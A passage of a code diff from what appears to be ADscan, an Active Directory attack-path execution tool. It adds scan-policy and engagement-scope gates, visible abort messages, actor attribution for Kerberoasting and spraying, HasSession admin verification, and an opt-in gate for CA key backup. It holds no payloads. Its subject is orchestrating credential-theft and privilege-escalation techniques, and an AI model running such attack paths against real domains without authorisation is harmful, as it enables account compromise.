+    shell: Any,
+    domain: str,
+    *,
+    summary: dict[str, Any],
+    context_username: str | None = None,
+    context_password: str | None = None,
+    search_mode_label: str | None = None,
+) -> bool:
+    """Execute a selected attack path (best-effort).
+
+    Called through :func:`execute_selected_attack_path`, which owns the run
+    lifecycle and the collapsed-pivot selection.
+
+    Returns:
+        True if an execution attempt was started, False otherwise.
+    """
+
     # --- Boundary enforcement: re-apply the readiness gate ---
     # Any caller may pass a raw (un-annotated) summary. We re-annotate here so
     # the reachability and credential gate is evaluated exactly once at the
@@ -9842,8 +11329,23 @@ def execute_selected_attack_path(
     )
     _gate_meta = summary.get("meta") or {}
     _gate_status = str(_gate_meta.get("execution_support_status") or "").strip().lower()
+    # S1: the first pending executable step is excluded by the scan policy, so
+    # the path is mapped and never started (no clock step, no cleanup scope).
+    if _gate_status == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED:
+        _refuse_path_for_scan_policy(shell, domain=domain, summary=summary)
+        return False
+    if _gate_status == _EXECUTION_STATUS_OUTSIDE_SCOPE:
+        _refuse_path_outside_engagement_scope(shell, domain=domain, summary=summary)
+        return False
     if _gate_status in {"unsupported", "blocked"}:
         _gate_reason = str(_gate_meta.get("execution_support_reason") or "").strip()
+        _refusing_run = get_active_execution_run(shell)
+        if _refusing_run is not None:
+            _refusing_run.refuse(
+                str(_gate_meta.get("execution_readiness_reason") or "")
+                or _gate_reason
+                or "Execution is not supported from the current vantage point."
+            )
         print_warning(
             "ADscan refuses to execute this attack path: "
             + (_gate_reason or "execution is not supported from the current vantage.")
@@ -9949,7 +11451,25 @@ def execute_selected_attack_path(
             *,
             kind: str,
             reason: str,
+            announce: bool = True,
         ) -> None:
+            """Persist a not-executed status for a step.
+
+            Announcing is the DEFAULT: the operator is told, on the visible sink,
+            that the step was not run and why, because an operator-launched path
+            that stops with only a debug line reads as a command that silently
+            does nothing. Pass ``announce=False`` ONLY when the caller already
+            prints its own visible line for the same abort (one message per
+            abort, never two), and say so in an inline comment. The detector in
+            ``tests/unit/cli/test_attack_path_abort_visibility.py`` enforces both
+            directions.
+            """
+            if announce:
+                print_warning(
+                    f"Step {rich_markup_escape(action)} on "
+                    f"{mark_sensitive(to_label or 'the target', 'node')} was not run, "
+                    f"so the path stopped: {rich_markup_escape(reason)}"
+                )
             if not from_label or not to_label:
                 return
             desired_status = "blocked"
@@ -10297,6 +11817,7 @@ def execute_selected_attack_path(
                     from_label,
                     to_label,
                     kind=kind_label,
+                    announce=False,  # the caller renders the blocked-steps table and panel right after
                     reason=kinds.get(key, default_reason),
                 )
 
@@ -10724,10 +12245,51 @@ def execute_selected_attack_path(
             """Update the in-path execution context after obtaining a new user credential."""
             if not isinstance(outcome, dict):
                 return
-            if (
-                str(outcome.get("key") or "").strip().lower()
-                != "user_credential_obtained"
-            ):
+            outcome_key = str(outcome.get("key") or "").strip().lower()
+            if outcome_key == "credential_already_held":
+                # A step that was not run because its result was already in
+                # hand (a password reset of an account whose credential the
+                # session holds): continue the path as that account with the
+                # held credential, and put the edge back to "discovered" with
+                # the reason, so it never reads as executed or as failed.
+                held_user = _normalize_account(
+                    str(outcome.get("compromised_user") or "")
+                )
+                held_secret = str(outcome.get("credential") or "").strip()
+                if held_user and held_secret:
+                    _set_carried_execution_credential(
+                        username=held_user,
+                        secret=held_secret,
+                        source_action="credential_already_held",
+                    )
+                    print_info_debug(
+                        "[attack_paths] step not run, credential already held; "
+                        f"continuing as {mark_sensitive(held_user, 'user')}"
+                    )
+                try:
+                    from adscan_core.reporting.attack_path_execution_events import (
+                        NOT_EXECUTED_REASON_KEY,
+                        NOT_NEEDED_CREDENTIAL_ALREADY_HELD,
+                    )
+                    from adscan_internal.services.attack_graph_runtime_service import (
+                        update_active_step_status,
+                    )
+
+                    # The reason is the "not needed" vocabulary SSOT: the run
+                    # summary, the reports and the web word it from there.
+                    update_active_step_status(
+                        shell,
+                        domain=domain,
+                        status="discovered",
+                        notes={
+                            NOT_EXECUTED_REASON_KEY: NOT_NEEDED_CREDENTIAL_ALREADY_HELD
+                        },
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
+                return
+            if outcome_key != "user_credential_obtained":
                 return
 
             compromised_user = _normalize_account(
@@ -10982,12 +12544,14 @@ def execute_selected_attack_path(
             elif status == "success":
                 prompt = (
                     f"Step #{step_index} ({action}) is marked success, but ADscan cannot "
-                    "continue from it with the currently available credentials. Re-run it now?"
+                    "continue from it with the currently available credentials. "
+                    "Re-run it now? Declining stops this attack path."
                 )
             else:
                 prompt = (
                     f"Step #{step_index} ({action}) was already attempted and ADscan cannot "
-                    "continue past it with the currently available credentials. Retry it now?"
+                    "continue past it with the currently available credentials. "
+                    "Retry it now? Declining stops this attack path."
                 )
             rerun = _confirm_step_rerun(prompt, default=False)
             print_info_debug(
@@ -11052,11 +12616,101 @@ def execute_selected_attack_path(
                     str(_safety_details.get("from") or ""),
                     str(_safety_details.get("to") or ""),
                     kind="dangerous_destructive",
+                    announce=False,  # the caller prints its own message right after
                     reason=_safety_reason,
                 )
                 print_warning(
-                    "ForceChangePassword not executed for safety: " + _safety_reason
+                    f"{action} not executed for safety: " + _safety_reason
                 )
+                return execution_started
+            # S2: scan-policy backstop (defense in depth for resumed runs and
+            # skip-ahead starts). The allowed prefix has already run (D-2b); an
+            # excluded step keeps its status, carries the excluded_by_scan_policy
+            # note and stops the path. One that already ran in an earlier scan
+            # and can be passed over is not executed again, so the path goes on.
+            if scan_policy_enforcement.step_excluded(shell, step):
+                _policy_details = (
+                    step.get("details")
+                    if isinstance(step.get("details"), dict)
+                    else {}
+                )
+                if scan_policy_enforcement.step_already_processed(
+                    step
+                ) and _attack_path_processed_step_is_bypassable(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    steps=steps,
+                    executable_indices=executable_indices,
+                    step_index=idx,
+                    step_status=str(step.get("status") or "").strip().lower(),
+                    context_username=context_username,
+                    context_password=context_password,
+                ):
+                    print_info_debug(
+                        "[attack_paths] scan-policy excluded step already processed "
+                        f"in an earlier run; continuing without re-running: index={idx} "
+                        f"action={mark_sensitive(action, 'detail')}"
+                    )
+                    continue
+                _refuse_step_for_scan_policy(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    step=step,
+                    step_index=idx,
+                    total_steps=total_executable_steps,
+                    last_executable_idx=last_executable_idx,
+                    from_label=str(_policy_details.get("from") or ""),
+                    to_label=str(_policy_details.get("to") or ""),
+                )
+                return execution_started
+            # Engagement scope (contractual, every run mode): a step whose acting
+            # object or target belongs to a domain outside the scope never runs.
+            # The route stays mapped; the step carries the outside-the-scope note.
+            if _refuse_step_outside_engagement_scope(
+                shell,
+                domain=domain,
+                summary=summary,
+                step=step,
+                step_index=idx,
+                total_steps=total_executable_steps,
+                last_executable_idx=last_executable_idx,
+            ):
+                return execution_started
+            # A directory write in a prefix the policy will not let complete
+            # is held back (founder decision 2026-11-08, D-2b, replaces D-2 there):
+            # read-only prefix steps still run, a write that would lead nowhere
+            # does not, unless an interactive operator chooses it.
+            _held_back = _prefix_write_held_back(
+                shell, summary=summary, steps=steps, step_index=idx, step=step
+            )
+            if _held_back is not None and not _operator_runs_held_back_write(
+                shell, action=action, title=str(_held_back.get("title") or "")
+            ):
+                _hold_back_prefix_write(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    step=step,
+                    step_index=idx,
+                    total_steps=total_executable_steps,
+                    last_executable_idx=last_executable_idx,
+                    held_back=_held_back,
+                )
+                print_info(
+                    f"Path stopped before {action}: {_held_back.get('title')} later in "
+                    "this path is excluded by the scan policy, so the change was not made."
+                )
+                return execution_started
+            # Run seam: settles the previous step's outcome and, in step mode,
+            # asks the operator before this one runs. A "stop here" ends the
+            # path here; the run records it as an operator decision, and the
+            # line printed comes from that decision (silence is never worded as
+            # an operator's stop).
+            _active_run = get_active_execution_run(shell)
+            if _active_run is not None and not _active_run.begin_step(idx):
+                print_info(_active_run.stop_line())
                 return execution_started
             relation_support = classify_relation_support(key)
             set_attack_path_step_context(
@@ -11139,6 +12793,7 @@ def execute_selected_attack_path(
                 )
                 continue
             if existing_step_decision == "cancel":
+                print_warning(_existing_step_cancel_message(idx, action))
                 print_info_debug(
                     "[attack_paths] cancelling path execution because a previously processed "
                     "step cannot be bypassed with the current credentials: "
@@ -11384,6 +13039,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing credential context for execution",
                     )
                     return execution_started
@@ -11417,6 +13073,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Target node is not a resolvable host",
                     )
                     return execution_started
@@ -11671,6 +13328,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Source MSSQL instance host not resolvable",
                     )
                     return execution_started
@@ -11711,6 +13369,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing credential context for execution",
                     )
                     return execution_started
@@ -11965,6 +13624,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Source MSSQL instance host not resolvable",
                     )
                     return execution_started
@@ -12005,6 +13665,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing credential context for execution",
                     )
                     return execution_started
@@ -12435,6 +14096,13 @@ def execute_selected_attack_path(
                         notes=final_notes,
                     )
                     if str(poll_notes.get("verification_status") or "") == "confirmed":
+                        _confirm_writelogonscript_password_reset(
+                            shell,
+                            change_id=strategy_notes.get("_wls_password_change_id"),
+                            target_user=str(
+                                strategy_notes.get("next_step_target_user") or ""
+                            ),
+                        )
                         chained_step_notes = {
                             "verification_status": "executed_via_writelogonscript",
                             "execution_origin_action": action,
@@ -12684,6 +14352,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="No usable execution credential context available",
                     )
                     return execution_started
@@ -12714,6 +14383,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unsupported",
+                        announce=False,  # the caller prints its own message right after
                         reason=reason or "Not supported for this target type",
                     )
                     table = Table(
@@ -12790,6 +14460,19 @@ def execute_selected_attack_path(
                 ace_result: bool | None = (
                     None  # sentinel — safe to check after try/except
                 )
+                # The status before this step is marked attempted, so a step the
+                # scan policy kept from running can be put back; and no marker
+                # left by an earlier step may describe this one.
+                _summary_steps = summary.get("steps")
+                _pre_step_status = (
+                    str(_summary_steps[idx - 1].get("status") or "")
+                    if isinstance(_summary_steps, list)
+                    and 0 < idx <= len(_summary_steps)
+                    and isinstance(_summary_steps[idx - 1], dict)
+                    else ""
+                )
+                scan_policy_enforcement.consume_step_not_executed(shell)
+                _policy_not_executed: dict[str, str] | None = None
                 _record_attack_path_execution_event(
                     shell,
                     domain=domain,
@@ -12893,6 +14576,32 @@ def execute_selected_attack_path(
                                 shell, context=exec_context
                             )
                         last_outcome = get_last_ace_execution_outcome(shell) or {}
+                        # The branch refused the technique it would perform and
+                        # ran nothing: represent it as a policy-excluded step,
+                        # never as attempted or failed. A step that refused one
+                        # technique and then succeeded with another keeps its
+                        # success.
+                        _policy_not_executed = (
+                            scan_policy_enforcement.consume_step_not_executed(shell)
+                        )
+                        if ace_result is True:
+                            _policy_not_executed = None
+                        if _policy_not_executed is not None:
+                            ace_result = None
+                            _settle_step_not_executed_by_policy(
+                                shell,
+                                domain=domain,
+                                summary=summary,
+                                step_index=idx,
+                                total_steps=total_executable_steps,
+                                executable_step_index=executable_step_position,
+                                last_executable_idx=last_executable_idx,
+                                action=action,
+                                from_label=from_label,
+                                to_label=to_label,
+                                pre_step_status=_pre_step_status,
+                                refusal=_policy_not_executed,
+                            )
                         # Concrete failure cause for a False result: the dedicated
                         # ACE failure-reason channel (set by execute_ace_step's
                         # authored exits) first, then any reason the execution
@@ -13043,6 +14752,18 @@ def execute_selected_attack_path(
                         last_outcome=last_outcome,
                     )
 
+                # A step the policy kept from running stops the path, exactly as
+                # a directly excluded step does (the next step depends on it).
+                if _policy_not_executed is not None:
+                    # Inside a run the step result already carries the policy
+                    # explanation; outside one, say why the path stopped here.
+                    if get_active_execution_run(shell) is None:
+                        print_info(
+                            f"Path stopped at {action}: the technique this step "
+                            "needs is excluded by the scan policy."
+                        )
+                    return execution_started
+
                 # Abort remaining path steps when this step definitively failed.
                 # A False result means the exploit ran and was rejected — the
                 # target state required by the next step was never established.
@@ -13109,7 +14830,9 @@ def execute_selected_attack_path(
                     return execution_started
 
                 spray_type, spray_category, spray_password = (
-                    _extract_password_spray_step_metadata(details)
+                    _extract_password_spray_step_metadata(
+                        details, shell=shell, domain=domain
+                    )
                 )
                 effective_spray_type = spray_category or spray_type
                 marked_target = mark_sensitive(target_user, "user")
@@ -13212,6 +14935,7 @@ def execute_selected_attack_path(
                             from_label,
                             to_label,
                             kind="unavailable",
+                            announce=False,  # the caller printed its own warning just above
                             reason="Spray mode could not be started",
                         )
                         return execution_started
@@ -13309,7 +15033,9 @@ def execute_selected_attack_path(
                         from_label=from_label,
                         to_label=to_label,
                         step_status="success",
-                        actor=target_user,
+                        # Nobody authenticated to spray; the recovered account is
+                        # the TARGET, not the principal that acted.
+                        actor="",
                     )
                 continue
 
@@ -13407,6 +15133,11 @@ def execute_selected_attack_path(
                     step_status="attempting",
                 )
                 ok = False
+                # Who MADE the request, for the run-result caption. Empty when
+                # unknown (AS-REP roasting is unauthenticated, and a Kerberoast
+                # that fell back to the assessment account does not know its
+                # name here): never the roasted user, who is the TARGET.
+                _roast_event_actor = ""
                 with _active_step_context(
                     action=action,
                     from_label=from_label,
@@ -13414,11 +15145,49 @@ def execute_selected_attack_path(
                     notes={"target_user": target_user},
                 ):
                     if key == "kerberoasting":
+                        # The TGS requests authenticate as the step's own actor
+                        # (the step-actor SSOT), never an arbitrary stored
+                        # credential. A local-account or ticket-path actor cannot
+                        # roast, so it falls back to the domain's assessment
+                        # account inside run_kerberoast_for_user.
+                        _roast_actor = None
+                        try:
+                            _roast_actor = resolve_step_execution_actor(
+                                shell,
+                                domain=domain,
+                                relation=key,
+                                from_label=from_label,
+                                to_label=to_label,
+                                summary=summary,
+                                context_username=context_username,
+                                context_password=context_password,
+                                steps=steps,
+                                step_index=idx,
+                                interactive=False,
+                            )
+                        except Exception as exc:  # noqa: BLE001 - fall back to the assessment account
+                            telemetry.capture_exception(exc)
+                            print_exception(exception=exc)
+                        _roast_actor_usable = bool(
+                            _roast_actor is not None
+                            and _roast_actor.username
+                            and _roast_actor.secret
+                            and str(_roast_actor.islocal).lower() != "true"
+                            and not str(_roast_actor.secret).lower().endswith(".ccache")
+                        )
+                        if _roast_actor_usable and _roast_actor is not None:
+                            _roast_event_actor = str(_roast_actor.username)
                         ok = run_kerberoast_for_user(
                             shell,
                             domain,
                             target_user=target_user,
                             target_domain=roast_target_domain,
+                            auth_username=(
+                                _roast_actor.username if _roast_actor_usable else None
+                            ),
+                            auth_secret=(
+                                _roast_actor.secret if _roast_actor_usable else None
+                            ),
                         )
                     else:
                         ok = run_asreproast_for_user(
@@ -13463,7 +15232,7 @@ def execute_selected_attack_path(
                     from_label=from_label,
                     to_label=to_label,
                     step_status="success",
-                    actor=target_user,
+                    actor=_roast_event_actor,
                 )
                 last_outcome = get_last_ace_execution_outcome(shell) or {}
                 _apply_execution_outcome_context_handoff(last_outcome)
@@ -13504,6 +15273,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing execution user context",
                     )
                     print_info_debug(
@@ -13538,6 +15308,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     print_info_debug(
@@ -13559,6 +15330,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing PDC IP in domain data",
                     )
                     print_info_debug(
@@ -13575,6 +15347,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing ADCS/CA info in domain data",
                     )
                     print_info_debug(
@@ -13746,6 +15519,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing execution user context",
                     )
                     return execution_started
@@ -13772,6 +15546,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -13789,6 +15564,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing PDC IP in domain data",
                     )
                     return execution_started
@@ -13802,6 +15578,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing ADCS/CA info in domain data",
                     )
                     return execution_started
@@ -14028,6 +15805,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing execution user context",
                     )
                     return execution_started
@@ -14054,6 +15832,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -14071,6 +15850,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing PDC IP in domain data",
                     )
                     return execution_started
@@ -14084,6 +15864,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing ADCS/CA info in domain data",
                     )
                     return execution_started
@@ -14301,6 +16082,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing execution user context",
                     )
                     return execution_started
@@ -14327,6 +16109,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -14344,6 +16127,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing PDC IP in domain data",
                     )
                     return execution_started
@@ -14357,6 +16141,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing ADCS/CA info in domain data",
                     )
                     return execution_started
@@ -15358,6 +17143,31 @@ def execute_selected_attack_path(
                             notes={"relay_method": relay_method},
                         )
                         return execution_started
+                    if relay_outcome == "not_permitted":
+                        # Declined before writing anything: the policy allows no
+                        # manual cleanup and the cleanup account could not be
+                        # verified for this domain. The step keeps its status (it
+                        # ran nothing) and carries the reason for the report.
+                        from adscan_internal.services.revert_permission import (  # noqa: PLC0415
+                            NOT_EXECUTED_REASON as _REVERT_NOT_PERMITTED,
+                        )
+
+                        try:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action_name,
+                                to_label=to_label,
+                                status="theoretical",
+                                notes={
+                                    "relay_method": relay_method,
+                                    "not_executed_reason": _REVERT_NOT_PERMITTED,
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+                        return execution_started
                     if relay_outcome != "success":
                         # The relay did not land (not viable / failed / precondition
                         # abort -> None). Mark THIS step and STOP — do NOT promote the
@@ -15548,6 +17358,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller prints its own message right after
                         reason=(
                             "No puppet user found in edge notes. Re-collect to populate "
                             "the writer-mediated precondition before executing ESC9."
@@ -16170,6 +17981,28 @@ def execute_selected_attack_path(
                     print_warning("Cannot execute AD CS ESC5: missing from/to details.")
                     return execution_started
 
+                # The CA key backup leaves a copy that cannot be withdrawn (only
+                # a CA key rotation invalidates it). Unattended audit runs skip
+                # it unless the operator enabled it explicitly; the decision is
+                # owned by durable_change_policy, not re-derived here.
+                from adscan_internal.services.durable_change_policy import (
+                    CA_KEY_BACKUP_SKIPPED_REASON,
+                    ca_key_backup_allowed,
+                )
+
+                if not ca_key_backup_allowed(shell):
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        # "dangerous" = the existing opt-in-policy marker (not
+                        # a hard-blocked safety abstention): the step is a real,
+                        # configuration-derived avenue left unexercised.
+                        kind="dangerous",
+                        reason=CA_KEY_BACKUP_SKIPPED_REASON,
+                    )
+                    return execution_started
+
                 domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                 if not isinstance(domain_data, dict):
                     domain_data = {}
@@ -16183,6 +18016,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing PDC/CA info in domain data",
                     )
                     return execution_started
@@ -16208,6 +18042,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing stored credential for execution user",
                     )
                     return execution_started
@@ -16228,6 +18063,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="CA host is not resolvable",
                     )
                     return execution_started
@@ -16318,6 +18154,14 @@ def execute_selected_attack_path(
                 continue
 
             if key == "hassession":
+                # CONTEXTUAL step. HasSession proves the two preconditions the
+                # session follow-ups need and acts on neither: the logon session
+                # exists on the host (the collected edge is the evidence) and the
+                # executing actor administers that host. What the session enables
+                # (a task run as the session user, an LSASS dump) is the
+                # ScheduledTask and DumpLSASS steps that follow it, each with its
+                # own status, ledger entries and rollback, the same way AdminTo
+                # relates to DumpLSA.
                 if not from_label or not to_label:
                     print_warning("Cannot execute HasSession: missing from/to details.")
                     _mark_blocked_step(
@@ -16325,6 +18169,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Missing from/to details",
                     )
                     return execution_started
@@ -16344,6 +18189,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Session host is not resolvable",
                     )
                     return execution_started
@@ -16358,6 +18204,7 @@ def execute_selected_attack_path(
                         from_label,
                         to_label,
                         kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
                         reason="Session user is not resolvable",
                     )
                     return execution_started
@@ -16367,7 +18214,7 @@ def execute_selected_attack_path(
                         shell,
                         domain=domain,
                         target_host=target_host,
-                        workflow_label="HasSession exploitation",
+                        workflow_label="HasSession verification",
                         service="smb",
                         resume_after_pivot=True,
                     )
@@ -16382,49 +18229,467 @@ def execute_selected_attack_path(
                     )
                     return execution_started
 
-                exec_username, password, exec_context_source = (
-                    _resolve_hassession_execution_user(
-                        shell,
-                        domain=domain,
-                        summary=summary,
-                        steps=steps,
-                        current_step_index=idx - 1,
-                        target_host=target_host,
-                        from_label=from_label,
-                        context_username=context_username,
-                        context_password=context_password,
-                    )
+                # One actor resolution path (the SSOT), the same ladder the dump
+                # family uses: HasSession authenticates to the SOURCE host.
+                session_actor = resolve_step_execution_actor(
+                    shell,
+                    domain=domain,
+                    relation=key,
+                    from_label=from_label,
+                    to_label=to_label,
+                    summary=summary,
+                    context_username=context_username,
+                    context_password=context_password,
+                    steps=steps,
+                    step_index=idx,
+                    strict_source=False,
+                    interactive=True,
                 )
-                if not exec_username or not password:
-                    marked_user = mark_sensitive(exec_username or from_label, "user")
-                    print_warning(
-                        "Cannot execute HasSession: no stored credential found for "
-                        f"{marked_user}."
+                if (
+                    session_actor is None
+                    or not session_actor.username
+                    or not session_actor.secret
+                ):
+                    # The actor is the local-admin holder of the session host,
+                    # never the host's machine account: say which privilege is
+                    # missing and whether the access step proved it.
+                    no_actor_reason = render_manufactured_followup_precondition_warning(
+                        relation=action,
+                        host=target_host,
+                        steps=steps,
+                        step_index=idx,
+                        from_label=from_label,
                     )
                     _mark_blocked_step(
                         action,
                         from_label,
                         to_label,
                         kind="unavailable",
-                        reason="Missing stored credential for execution user",
+                        announce=False,  # the caller printed its own warning just above
+                        reason=no_actor_reason,
                     )
                     return execution_started
-                if exec_context_source == "generic_context":
+                if session_actor.source == ACTOR_SOURCE_SCOPED_TICKET:
+                    # A scoped service ticket opens one service on one host; the
+                    # administrator check below and the Task Scheduler follow-up
+                    # both bind with a password or hash.
+                    print_warning(
+                        "Cannot execute HasSession: the only access to the session "
+                        "host is a scoped service ticket, which cannot drive the "
+                        "session follow-ups."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        announce=False,  # the caller printed its own warning just above
+                        reason="Only a scoped service ticket is available for the host",
+                    )
+                    return execution_started
+                exec_username = session_actor.username
+                password = session_actor.secret
+
+                from adscan_internal.services.attack_step_domain_resolution import (  # noqa: PLC0415
+                    resolve_source_domain_and_kdc,
+                )
+
+                exec_source_domain, exec_source_kdc = resolve_source_domain_and_kdc(
+                    shell,
+                    target_domain=domain,
+                    exec_username=exec_username,
+                    raw_principal_label=from_label,
+                )
+                kdc_ip: str | None = exec_source_kdc
+                if not kdc_ip:
+                    try:
+                        kdc_ip = resolve_dc_ip(
+                            (getattr(shell, "domains_data", {}) or {}).get(
+                                exec_source_domain, {}
+                            )
+                            or {}
+                        )
+                    except Exception:  # noqa: BLE001
+                        kdc_ip = None
+                try:
+                    is_hash = bool(shell.is_hash(password))
+                except Exception:  # noqa: BLE001
+                    is_hash = False
+
+                session_notes = {
+                    "username": exec_username,
+                    "target_host": target_host,
+                    "session_user": session_user,
+                    "session_evidence": "collected_edge",
+                    "exec_context_source": session_actor.source,
+                }
+                execution_started = True
+                _record_attack_path_execution_event(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    event_stage="step_attempting",
+                    message=f"Attempting HasSession check on {target_host}.",
+                    step_index=idx,
+                    total_steps=total_executable_steps,
+                    executable_step_index=executable_step_position,
+                    last_executable_idx=last_executable_idx,
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    step_status="attempting",
+                    actor=exec_username,
+                    target_host=target_host,
+                )
+                with _active_step_context(
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes=session_notes,
+                ):
+                    try:
+                        _update_attack_path_step_status_at_index(
+                            shell,
+                            domain=domain,
+                            summary=summary,
+                            step_index=idx - 1,
+                            status="attempted",
+                            notes=session_notes,
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+
+                    ok, verify_reason, verify_detail = run_async_sync(
+                        _verify_attack_step_native(
+                            service="smb",
+                            require_admin=True,
+                            domain=exec_source_domain,
+                            username=exec_username,
+                            secret=password,
+                            is_hash=is_hash,
+                            target_host=target_host,
+                            target_hostname=target_host,
+                            kdc_ip=kdc_ip,
+                            workspace_dir=str(
+                                getattr(shell, "current_workspace_dir", "") or ""
+                            )
+                            or None,
+                            shell=shell,
+                            is_local_account=session_actor.islocal == "true",
+                        )
+                    )
                     print_info_debug(
-                        "[hassession] No prior host-access credential context "
-                        "for this host; using generic execution credential context."
+                        f"[attack_paths] hassession admin verifier: {verify_detail} "
+                        f"reason={verify_reason.value}"
+                    )
+                    if not ok:
+                        edge_status_on_fail = {
+                            _VerifyFailReason.HOST_OFFLINE: "unavailable",
+                            _VerifyFailReason.SERVICE_DOWN: "unavailable",
+                            _VerifyFailReason.NO_PRIVILEGE: "failed",
+                            _VerifyFailReason.AUTH_FAILED: "attempted",
+                            _VerifyFailReason.UNKNOWN: "unavailable",
+                        }.get(verify_reason, "failed")
+                        try:
+                            _update_attack_path_step_status_at_index(
+                                shell,
+                                domain=domain,
+                                summary=summary,
+                                step_index=idx - 1,
+                                status=edge_status_on_fail,
+                                notes={
+                                    **session_notes,
+                                    "fail_reason": verify_reason.value,
+                                    "verify_detail": verify_detail,
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+                        _record_attack_path_execution_event(
+                            shell,
+                            domain=domain,
+                            summary=summary,
+                            event_stage="step_failed",
+                            message=(
+                                "HasSession did not confirm local administrator "
+                                f"access on {target_host}. Reason: "
+                                f"{verify_reason.value}."
+                            ),
+                            step_index=idx,
+                            total_steps=total_executable_steps,
+                            executable_step_index=executable_step_position,
+                            last_executable_idx=last_executable_idx,
+                            action=action,
+                            from_label=from_label,
+                            to_label=to_label,
+                            step_status=edge_status_on_fail,
+                            actor=exec_username,
+                            target_host=target_host,
+                            reason=verify_reason.value,
+                        )
+                        _show_verify_failure_panel(
+                            action=action,
+                            host=target_host,
+                            reason=verify_reason,
+                            username=exec_username,
+                        )
+                        return True
+
+                    _update_attack_path_step_status_at_index(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        step_index=idx - 1,
+                        status="success",
+                        notes=session_notes,
+                    )
+                    _record_attack_path_execution_event(
+                        shell,
+                        domain=domain,
